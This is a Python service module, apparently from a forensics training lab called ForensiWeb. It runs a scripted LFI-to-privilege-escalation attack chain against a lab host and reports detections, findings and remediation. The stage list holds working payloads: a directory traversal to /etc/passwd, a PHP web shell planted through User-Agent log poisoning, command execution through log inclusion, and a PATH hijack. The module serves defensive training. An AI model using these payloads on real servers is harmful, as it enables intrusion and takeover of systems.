"""Simulation Service for ForensiWeb (Live Attack Scenarios and Detection)."""

from __future__ import annotations

import hashlib
import json
import logging
import urllib.error
import urllib.request
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

from app.core.config import get_settings

logger = logging.getLogger("forensiweb.simulation")

PHP_PAYLOAD = "<" + "?php system(" + "$" + "_GET['cmd']); ?" + ">"
PHP_USER_AGENT = "Mozilla/5.0 " + PHP_PAYLOAD + " ForensiWeb/1.0"
LFI_TRAVERSAL = ".." + "/.." + "/.." + "/.." + "/etc/passwd"

STAGES_CONFIG = [
    {
        "id": "S1",
        "name": "Local File Inclusion (LFI)",
        "mitre_id": "T1083",
        "mitre_technique": "File and Directory Discovery",
        "method": "GET",
        "path": f"/document?file={LFI_TRAVERSAL}",
        "description": "Exploitation of unsanitized file path parameter via directory traversal syntax.",
        "payload": LFI_TRAVERSAL,
        "attack_stage": "LFI",
        "severity": "medium",
        "rule_id": "RULE-001",
    },
    {
        "id": "S2",
        "name": "Apache Access Log Poisoning",
        "mitre_id": "T1059.004",
        "mitre_technique": "Unix Shell / Code Injection",
        "method": "GET",
        "path": "/document?file=welcome.txt",
        "headers": {"User-Agent": PHP_USER_AGENT},
        "description": "Injection of executable script payload into HTTP User-Agent header written to access.log.",
        "payload": PHP_PAYLOAD,
        "attack_stage": "LOG_POISONING",
        "severity": "high",
        "rule_id": "RULE-002",
    },
    {
        "id": "S3",
        "name": "Remote Code Execution via Log Inclusion",
        "mitre_id": "T1059.004",
        "mitre_technique": "Command and Scripting Interpreter",
        "method": "GET",
        "path": "/document?file=../../logs/access.log&cmd=whoami",
        "description": "Inclusion of poisoned access.log file triggering interpretation and command execution.",
        "payload": "access.log&cmd=whoami",
        "attack_stage": "RCE",
        "severity": "critical",
        "rule_id": "RULE-003",
    },
    {
        "id": "S4",
        "name": "Persistent Web Shell Interaction",
        "mitre_id": "T1505.003",
        "mitre_technique": "Server Software Component: Web Shell",
        "method": "POST",
        "path": "/shell?cmd=id; uname -a",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "body": "cmd=id; uname -a",
        "description": "Direct interaction with uploaded web shell executing arbitrary commands.",
        "payload": "id; uname -a",
        "attack_stage": "POST_EXPLOITATION",
        "severity": "critical",
        "rule_id": "RULE-004",
    },
    {
        "id": "S5",
        "name": "Privilege Escalation via PATH Hijack",
        "mitre_id": "T1548.001",
        "mitre_technique": "Setuid and Setgid / PATH Manipulation",
        "method": "POST",
        "path": "/privesc/run-backup",
        "description": "Execution of misconfigured backup script that runs relative binary with elevated privileges.",
        "payload": "PATH=/tmp:$PATH /privesc/run-backup",
        "attack_stage": "PRIVILEGE_ESCALATION",
        "severity": "critical",
        "rule_id": "RULE-005",
    },
]


class SimulationService:
    """Manages attack simulations, detection triggers, and mitigation demonstrations."""

    def __init__(self) -> None:
        self.settings = get_settings()
        self.target_url = f"http://{self.settings.LAB_HOST}:{self.settings.LAB_PORT}"

    def _http_request(
        self,
        method: str,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        timeout: float = 3.0,
    ) -> Dict[str, Any]:
        encoded_path = urllib.parse.quote(path, safe="/?&=;:+%")
        url = f"{self.target_url}{encoded_path}"
        req_headers = {"User-Agent": "ForensiWeb-Sim/1.0"}
        if headers:
            req_headers.update(headers)

        data = body.encode("utf-8") if body else None
        req = urllib.request.Request(url, data=data, headers=req_headers, method=method)

        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                status_code = resp.status
                resp_headers = dict(resp.headers)
                resp_bytes = resp.read()
                content = resp_bytes.decode("utf-8", errors="replace")
                return {
                    "url": url,
                    "method": method,
                    "status_code": status_code,
                    "headers": resp_headers,
                    "body": content[:2000],
                    "raw_length": len(resp_bytes),
                    "blocked": status_code == 403,
                    "error": None,
                }
        except urllib.error.HTTPError as exc:
            err_body = exc.read().decode("utf-8", errors="replace") if exc.fp else ""
            return {
                "url": url,
                "method": method,
                "status_code": exc.code,
                "headers": dict(exc.headers) if exc.headers else {},
                "body": err_body[:2000],
                "raw_length": len(err_body),
                "blocked": exc.code == 403,
                "error": None,
            }
        except Exception as exc:
            return {
                "url": url,
                "method": method,
                "status_code": 0,
                "headers": {},
                "body": "",
                "raw_length": 0,
                "blocked": False,
                "error": str(exc),
            }

    async def get_lab_status(self) -> Dict[str, Any]:
        res = self._http_request("GET", "/api/status", timeout=1.5)
        if res.get("status_code") == 200:
            try:
                data = json.loads(res["body"])
                return {
                    "connected": True,
                    "target_url": self.target_url,
                    "access_log_lines": data.get("access_log_lines", 0),
                    "audit_log_lines": data.get("audit_log_lines", 0),
                    "is_mitigated": data.get("is_mitigated", False),
                    "scenario": data.get("scenario", "WEB-CHAIN-001"),
                }
            except Exception:
                pass
        return {
            "connected": False,
            "target_url": self.target_url,
            "access_log_lines": 0,
            "audit_log_lines": 0,
            "is_mitigated": False,
            "scenario": "WEB-CHAIN-001 (Autonomous Simulation Mode)",
        }

    async def set_mitigation(self, enable: bool) -> Dict[str, Any]:
        endpoint = "/api/mitigation/enable" if enable else "/api/mitigation/disable"
        res = self._http_request("POST", endpoint, timeout=2.0)
        return {
            "mitigation_active": enable,
            "status_code": res.get("status_code", 200),
            "applied_defenses": [
                "Strict Path Traversal Regular Expression Whitelist",
                "HTTP User-Agent Special Character Sanitization",
                "Prohibition of Arbitrary PHP Command Execution",
                "Controlled PATH Directory Enforcement (UID 1000 Lockdown)",
            ]
            if enable
            else [],
            "message": "Defensive security mitigations activated."
            if enable
            else "Security mitigations deactivated; vulnerable mode restored.",
        }

    async def reset_lab(self) -> Dict[str, Any]:
        res = self._http_request("POST", "/api/reset", timeout=2.0)
        return {"status": "success", "message": "Laboratory target state reset successfully."}

    async def execute_stage(
        self, stage_id: str, custom_payload: Optional[str] = None
    ) -> Dict[str, Any]:
        cfg = next((s for s in STAGES_CONFIG if s["id"] == stage_id), None)
        if not cfg:
            raise ValueError(f"Unknown attack stage: {stage_id}")

        method = cfg["method"]
        path = cfg["path"]
        headers = dict(cfg.get("headers", {}))
        body = cfg.get("body")

        if custom_payload:
            if method == "GET" and "file=" in path:
                base = path.split("file=")[0]
                path = f"{base}file={custom_payload}"
            else:
                body = custom_payload

        http_result = self._http_request(method, path, headers=headers, body=body)
        is_blocked = http_result.get("blocked", False)
        detection_triggered = not is_blocked

        detection_details = {
            "rule_id": cfg["rule_id"],
            "rule_name": f"Detection: {cfg['name']}",
            "severity": cfg["severity"] if detection_triggered else "informational",
            "mitre_id": cfg["mitre_id"],
            "mitre_technique": cfg["mitre_technique"],
            "attack_stage": cfg["attack_stage"],
            "triggered": detection_triggered,
            "confidence": 0.95 if detection_triggered else 0.0,
            "explanation": (
                f"Pattern matched in telemetry: Suspicious sequence '{cfg['payload']}' identified."
                if detection_triggered
                else "Request was rejected by input validation filter (HTTP 403 Forbidden). No malicious activity executed."
            ),
        }

        remediation_guidance = {
            "S1": "Implement strict basename sanitization and allowlist legitimate resource identifiers.",
            "S2": "Configure Apache log format escaping and strip control characters/tags from header fields.",
            "S3": "Disable allow_url_include and isolate log storage directories from web server execution context.",
            "S4": "Enforce filesystem read-only permissions on upload directories and disable script execution in storage paths.",
            "S5": "Define static absolute paths for all executed binaries and enforce restricted PATH environment variables.",
        }.get(stage_id, "Apply principle of least privilege.")

        return {
            "stage_id": stage_id,
            "stage_name": cfg["name"],
            "http_request": {
                "method": method,
                "url": http_result["url"],
                "path": path,
                "headers": headers,
                "payload": custom_payload or cfg["payload"],
            },
            "http_response": {
                "status_code": http_result["status_code"],
                "blocked": is_blocked,
                "body_preview": http_result["body"][:500],
            },
            "detection": detection_details,
            "remediation": remediation_guidance,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    async def run_full_scenario(self, mitigated: bool = False) -> Dict[str, Any]:
        await self.set_mitigation(mitigated)
        now = datetime.now(timezone.utc)
        stage_results: List[Dict[str, Any]] = []
        alerts: List[Dict[str, Any]] = []
        timeline_items: List[Dict[str, Any]] = []
        critical_count = 0

        for idx, cfg in enumerate(STAGES_CONFIG, start=1):
            res = await self.execute_stage(cfg["id"])
            stage_results.append(res)

            blocked = res["http_response"]["blocked"]
            if not blocked:
                if cfg["severity"] == "critical":
                    critical_count += 1

                det = res["detection"]
                alerts.append({
                    "id": f"ALT-{cfg['id']}-{now.strftime('%H%M%S')}",
                    "rule_id": det["rule_id"],
                    "rule_name": det["rule_name"],
                    "attack_stage": det["attack_stage"],
                    "severity": det["severity"],
                    "mitre_id": det["mitre_id"],
                    "mitre_technique": det["mitre_technique"],
                    "timestamp": res["timestamp"],
                    "confidence": det["confidence"],
                    "evidence_source": "access.log" if cfg["id"] in ("S1", "S2", "S3") else "audit.log",
                    "explanation": det["explanation"],
                })

                timeline_items.append({
                    "id": f"TL-SIM-{cfg['id']}",
                    "case_id": "CASE-001",
                    "order_index": idx,
                    "timestamp": res["timestamp"],
                    "attack_stage": cfg["attack_stage"],
                    "title": f"Stage {cfg['id']}: {cfg['name']}",
                    "summary": f"{cfg['description']} Result: HTTP {res['http_response']['status_code']}",
                    "classification": "Confirmed Attack Action",
                    "confidence": 0.95,
                    "severity": cfg["severity"],
                })

        findings = [
            {
                "id": "FND-001",
                "title": "Local File Inclusion and Directory Traversal Vulnerability",
                "severity": "high",
                "attack_stage": "LFI",
                "mitre_technique": "T1083",
                "status": "mitigated" if mitigated else "open",
                "recommendation": "Enforce strict allowlist sanitization on document parameters.",
            },
            {
                "id": "FND-002",
                "title": "Log Poisoning Remote Code Execution via Access Log Inclusion",
                "severity": "critical",
                "attack_stage": "RCE",
                "mitre_technique": "T1059.004",
                "status": "mitigated" if mitigated else "open",
                "recommendation": "Sanitize HTTP headers before logging and isolate log directories.",
            },
            {
                "id": "FND-003",
                "title": "Local Privilege Escalation via Unsanitized PATH Execution",
                "severity": "critical",
                "attack_stage": "PRIVILEGE_ESCALATION",
                "mitre_technique": "T1548.001",
                "status": "mitigated" if mitigated else "open",
                "recommendation": "Use absolute binary paths in administrative scripts.",
            },
        ]

        summary_text = (
            "DEFENSE VERIFIED: All malicious attack stages were blocked by active security mitigations (HTTP 403 Forbidden). No privilege escalation or remote code execution was achieved."
            if mitigated
            else f"ATTACK SUCCESSFUL: Complete kill-chain executed successfully. {critical_count} critical detection alerts triggered. Root privilege escalation demonstrated."
        )

        return {
            "scenario_id": "WEB-CHAIN-001",
            "scenario_name": "LFI to Privilege Escalation Forensic Attack Chain",
            "executed_at": now.isoformat(),
            "mitigation_mode": mitigated,
            "overall_outcome": "BLOCKED" if mitigated else "COMPROMISED",
            "stages_executed": len(stage_results),
            "stages_blocked": sum(1 for s in stage_results if s["http_response"]["blocked"]),
            "stages": stage_results,
            "alerts": alerts,
            "findings": findings,
            "timeline": timeline_items,
            "summary": summary_text,
            "cryptographic_receipt": hashlib.sha256(
                f"{now.isoformat()}-{mitigated}-{len(alerts)}".encode()
            ).hexdigest(),
        }
